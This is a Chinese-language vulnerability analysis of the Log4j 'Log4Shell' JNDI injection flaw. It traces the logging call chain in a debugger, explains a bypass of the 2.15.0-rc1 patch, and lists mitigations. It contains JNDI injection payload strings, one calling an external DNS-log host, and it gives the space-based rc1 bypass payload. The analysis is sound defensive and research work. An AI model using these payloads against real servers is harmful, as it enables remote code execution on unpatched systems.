漏洞成因：
=====

当日志信息中含有`${`字符串时，程序会使用`lookup`解析字符串导致产生注入漏洞。  
lookup机制提供了一种在任意位置向Log4j配置添加值的方法，支持`date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j`这些协议，攻击者可以使用特定payload构造jndi协议，造成JNDI注入，进而造成RCE漏洞

代码分析：
=====

使用唐小风的exp搭建一个demo，<https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce>  
1、给logger.error()打上断点，进行debug调试  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ae58f8e19d9db6c8edb32da9cdd8b6854b700fa7.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ae58f8e19d9db6c8edb32da9cdd8b6854b700fa7.png)  
2、点击下一步，进入到了error:AbstractLogger (org.apache.logging.log4j.spi)中  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-275ba27f94a82e603acb65fe12f419158df41aff.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-275ba27f94a82e603acb65fe12f419158df41aff.png)  
3、跟进logIfEnabled:AbstractLogger (org.apache.logging.log4j.spi)中  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1da085e579aa45b7904832b3b4621d3b9cddb889.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1da085e579aa45b7904832b3b4621d3b9cddb889.png)  
这里会调用isEnabled:Logger (org.apache.logging.log4j.core)判断logger的级别  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d9a43cd154d9919578f406fed76440292514b392.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d9a43cd154d9919578f406fed76440292514b392.png)  
如果满足要求，会进入 logMessage:AbstractLogger(org.apache.logging.log4j.spi)中  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e48928877d13becfaa82a6caf7f964b84da9d114.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e48928877d13becfaa82a6caf7f964b84da9d114.png)  
这里省略一些不重要的函数调用，直接进入log中  
4、LoggerConfig:logEvent(org.apache.logging.log4j.core.config)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-23108394b4667dd16ebfcb9f997bc6598ed85a24.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-23108394b4667dd16ebfcb9f997bc6598ed85a24.png)

然后进入到 processLogEvent:LoggerConfig (org.apache.logging.log4j.core.config)中调用callAppenders  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-183c9f698ff2094cac1f5891eb5368f1b8026682.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-183c9f698ff2094cac1f5891eb5368f1b8026682.png)  
callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)中调用callAppender  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e343c1ddee79b9e6c62bf77745d520d130474fb.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e343c1ddee79b9e6c62bf77745d520d130474fb.png)

tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)  
中调用append  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ac7d73129ee0245ae74c2a3a467069badbd05288.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ac7d73129ee0245ae74c2a3a467069badbd05288.png)  
directEncodeEvent:197AbstractOutputStreamAppender(org.apache.logging.log4j.core.appender)中调用encode  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-83647376ad56b2d069435b9d1530ce4e2d83a4dc.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-83647376ad56b2d069435b9d1530ce4e2d83a4dc.png)  
toText:244, PatternLayout (org.apache.logging.log4j.core.layout)中调用toSerializable  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-341da66bf36a75a75042d8d828de1b932b76ac93.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-341da66bf36a75a75042d8d828de1b932b76ac93.png)  
toSerializable:344,PatternLayout$PatternSerializer(org.apache.logging.log4j.core.layout)中调用format  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b75dbe3f0b9674acaf3d5754f277bc1f52304e0f.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b75dbe3f0b9674acaf3d5754f277bc1f52304e0f.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a51ac6471638f597aac62c2ba460d9cc8b479480.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a51ac6471638f597aac62c2ba460d9cc8b479480.png)  
5、我们跟进到format:60, LiteralPatternConverter (org.apache.logging.log4j.core.pattern)这里是第一个关键点，我们看以下代码

```java
this.substitute = config != null && literal.contains("${");
this.substitute ? this.config.getStrSubstitutor().replace(event, this.literal) : this.literal
```

这是一个三元表达式,需要同时满足config不为空和result包含`${`,才会运行 `this.config.getStrSubstitutor().replace(event, result)`,所以payload中要有`${`才可以

![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dc62ba4f749e246996b97b84ec0ff76ac1385bbb.png)  
继续跟进到substitute:StrSubstitutor (org.apache.logging.log4j.core.lookup)  
中，可以看到匹配一些特殊字符  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3fdcc113b198822810b60441470d251196ae9b7b.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3fdcc113b198822810b60441470d251196ae9b7b.png)  
如果字符串中有这些字符就进行删除，我们的payload就被处理为了`jndi:ldap://h1glio.dnslog.cn/id`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f4484f3487209b78bceba9dc8e060ac5b149cc4d.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f4484f3487209b78bceba9dc8e060ac5b149cc4d.png)  
继续跟进

```java
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) {
    StrLookup resolver = this.getVariableResolver();
    return resolver == null ? null : resolver.lookup(event, variableName);
}
```

调用了 getVariableResolver:StrSubstitutor (org.apache.logging.log4j.core.lookup)，该方法会根据协议来进行处理操作，支持协议有`date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j`  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-05a1d29e65e4436d78b4d617da39c86c51f27f28.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-05a1d29e65e4436d78b4d617da39c86c51f27f28.png)  
然后跟进到 lookup: Interpolator (org.apache.logging.log4j.core.lookup)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-56911146381ea6fffc59fd91443779300d7b4a7f.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-56911146381ea6fffc59fd91443779300d7b4a7f.png)

程序匹配到来jndi，就会选用Jndi Lookup进行处理.JndiLookup允许通过JNDI检索变量，默认情况下, key的前缀为 `java:comp/env /`，但如果key包含`:`,则不会添加前缀  
关于lookup详情，可参考文档https://www.docs4dev.com/docs/zh/log4j2/2.x/all/manual-lookups.html  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-37ec93e111e13058b029945fe4bb2f948ca1326f.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-37ec93e111e13058b029945fe4bb2f948ca1326f.png)  
继续跟进，在 lookup:JndiManager (org.apache.logging.log4j.core.net)  
lookup:56, 中会调用 jndiManager.lookup解析请求,最终形成注入漏洞.  
[![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d05dc79188b23d3291225ffd8f9dcf52617ac716.png)](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d05dc79188b23d3291225ffd8f9dcf52617ac716.png)

Bypass rc1：
===========

2021年12月06日，log4j2 发布修复包 log4j-2.15.0-rc1.jar，但是rc1存在被绕过的风险。  
我们看下官方的rc2的修复包，对比rc1，我们看到是在catch下面加了return null。  
其实rc1的绕过就在此处，想办法让其抛出`URISyntaxException`异常，那么代码就能进入到catch中，然后就能像未修复之前，执行lookup。

查阅资料发现`URI uri = new URI(name);`其实是将name转换为等效的 URI，任何 name实例只要遵守 RFC 2396 就可以转化为 URI，有些未严格遵守该规则的 name 将无法转化，就会抛出`URISyntaxException`异常，所以我们使用`${jndi:ldap://127.0.0.1:1389/ badClassName}`就可以绕过rc1，注意`/`与`badClassName`之间存在空格，空格的存在使得 name未遵守RFC 2396，就会抛出异常，进而执行`lookup`。  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-03e394b57c40f8e6e53fb209fbbec2df4ada0f7d.jpg)  
![](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fa26b7dbd84978ea809670e28ab9ba536f173224.jpg)

应急方案：
=====

```php
可以使用waf等安全设备对${}样式的字符串进行匹配拦截；   
在log4j2.ini配置中可以设置log4j2formatMsgNoLookups=True 禁止解析 JDNI；
系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true；
修改Jvm运行参数: -Dlog4j2.formatMsgNoLookups=true；
```